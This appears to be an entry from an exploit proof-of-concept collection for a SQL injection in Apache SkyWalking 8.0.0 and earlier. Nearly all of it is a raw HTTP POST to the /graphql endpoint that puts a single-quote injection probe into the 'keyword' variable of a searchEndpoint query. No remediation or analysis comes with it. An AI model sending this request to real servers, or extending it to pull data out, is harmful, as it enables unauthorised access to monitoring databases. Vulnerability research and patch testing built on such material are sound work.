# Skywalking Sqli

- Skywalking<=8.0.0
- Many Sqli points

```
POST /graphql HTTP/1.1
Host: 8.8.8.8:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8
Content-Length: 248
Origin: http://8.8.8.8:8080
Connection: close
Referer: http://8.8.8.8:8080/

{"query":"query queryEndpoints($serviceId: ID!, $keyword: String!) {\n    getEndpoints: searchEndpoint(serviceId: $serviceId, keyword: $keyword, limit: 100) {\n      key: id\n      label: name\n    }\n}","variables":{"serviceId":"3","keyword":"'"}}
```
